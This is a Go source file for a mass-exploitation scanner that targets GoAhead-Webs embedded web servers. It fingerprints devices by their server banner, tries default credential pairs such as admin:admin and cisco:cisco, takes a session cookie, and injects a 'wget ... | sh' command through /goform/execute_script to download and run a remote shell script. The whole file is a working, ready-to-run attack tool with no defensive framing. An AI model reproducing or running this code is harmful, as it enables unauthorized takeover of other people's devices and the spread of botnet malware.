package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync/atomic"
	"time"
)

var (
	StatusAttempts int64 = 0
	StatusFound    int64 = 0
	StatusLogins   int64 = 0
	StatusExecuted int64 = 0

	ConnectTimeout = 30 * time.Second
	ReadTimeout    = 15 * time.Second
	WriteTimeout   = 10 * time.Second

	conf = &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
	}

	dialer = &net.Dialer{Timeout: ConnectTimeout}

	HttpBanner = "Server: GoAhead-Webs"

	Payload = "wget+http://urip/pensex.sh+-O-+|+sh"

	Combos = []string{
		"useradmin:admin",
		"admin:admin",
		"cisco:cisco",
		"admin:cisco",
		"admin: ",
	}

	Mode string // set from os.Args[2]
)

type Device struct {
	Session string
}

func CloseConn(conn net.Conn) {
	_ = conn.Close()
}

func CheckTarget(target string) error {
	var conn net.Conn
	var err error

	if Mode == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, ConnectTimeout)
	}
	if err != nil {
		return err
	}
	defer CloseConn(conn)

	_ = conn.SetWriteDeadline(time.Now().Add(WriteTimeout))
	_ = conn.SetReadDeadline(time.Now().Add(ReadTimeout))

	_, _ = conn.Write([]byte("GET /index.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	response, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if strings.Contains(string(response), HttpBanner) {
		return nil
	}
	return errors.New("invalid http banner")
}

func (device *Device) ExecutePayload(target string) error {
	var conn net.Conn
	var err error

	if Mode == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, ConnectTimeout)
	}
	if err != nil {
		return err
	}
	defer CloseConn(conn)

	_ = conn.SetWriteDeadline(time.Now().Add(WriteTimeout))
	_ = conn.SetReadDeadline(time.Now().Add(ReadTimeout))

	body := fmt.Sprintf("$(%s)", Payload)

	request := fmt.Sprintf("GET /goform/execute_script?sys_list="+Payload+" HTTP/1.1\r\n"+
		"Host: "+target+"\r\n"+
		"Content-Length: %d\r\n"+
		"Cookie: ASPSSIONID=%s\r\n"+
		"User-Agent: Hello World/1.0\r\n\r\n"+
		"%s",
		len(body),
		device.Session,
		body,
	)

	_, err = conn.Write([]byte(request))
	return err
}

func ProcessLogin(target, user, pass string) (*Device, error) {
	var conn net.Conn
	var err error

	if Mode == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, ConnectTimeout)
	}
	if err != nil {
		return nil, err
	}
	defer CloseConn(conn)

	body := fmt.Sprintf("user_name=" + user + "&password=" + pass)

	request := fmt.Sprintf("POST /goform/websLogin HTTP/1.1\r\n"+
		"Host: "+target+"\r\n"+
		"Content-Length: %d\r\n"+
		"User-Agent: Hello World/1.0\r\n\r\n"+
		"%s",
		len(body),
		body,
	)

	_, _ = conn.Write([]byte(request))

	response, err := io.ReadAll(conn)
	if err != nil {
		return nil, err
	}

	var session string
	for _, s := range strings.Split(string(response), "\n") {
		if !strings.Contains(s, "Set-Cookie:") {
			continue
		}
		if strings.Contains(s, "HttpOnly") {
			continue
		}

		ye := strings.Split(s, "=")
		// FIX: require at least two parts (key and value)
		if len(ye) < 2 {
			continue
		}
		session = ye[1]
		// Remove trailing ";path=/" and similar
		session = strings.ReplaceAll(session, ";path=/", "")
		session = strings.ReplaceAll(session, ";path", "")
		break // take the first valid cookie
	}

	if session == "" {
		return nil, errors.New("no cookie")
	}

	return &Device{Session: session}, nil
}

func Process(target string) {
	atomic.AddInt64(&StatusAttempts, 1)

	/* Check Target */
	if err := CheckTarget(target); err != nil {
		return
	}
	atomic.AddInt64(&StatusFound, 1)

	var device *Device
	var err error

	for _, combo := range Combos {
		parts := strings.SplitN(combo, ":", 2)
		if len(parts) != 2 {
			continue
		}
		user, pass := parts[0], parts[1]
		device, err = ProcessLogin(target, user, pass)
		if device == nil || err != nil {
			continue
		}

		atomic.AddInt64(&StatusLogins, 1)
		fmt.Printf("[%s] Signed in: %s:%s (%s)\n", target, user, pass, device.Session)
		break
	}

	if device == nil {
		return
	}

	if err = device.ExecutePayload(target); err != nil {
		return
	}
	atomic.AddInt64(&StatusExecuted, 1)
}

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Missing arguments. Usage: %s <port/listen> <http/https>\n", os.Args[0])
		return
	}

	Mode = os.Args[2] // http or https

	// Status reporter goroutine
	go func() {
		start := time.Now()
		for {
			fmt.Printf("%.0fs | Attempted: %d | Devices Found: %d | Logins: %d | Executed: %d\n",
				time.Since(start).Seconds(),
				atomic.LoadInt64(&StatusAttempts),
				atomic.LoadInt64(&StatusFound),
				atomic.LoadInt64(&StatusLogins),
				atomic.LoadInt64(&StatusExecuted),
			)
			time.Sleep(1 * time.Second)
		}
	}()

	// Read targets from stdin (one per line)
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		target := scanner.Text()
		if target == "" {
			continue
		}
		if os.Args[1] == "listen" {
			go Process(target)
		} else {
			go Process(target + ":" + os.Args[1])
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "error reading stdin: %v\n", err)
	}
}

func EncodeBase64(input []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(input))
}

func DecodeBase64(input []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(input))
}
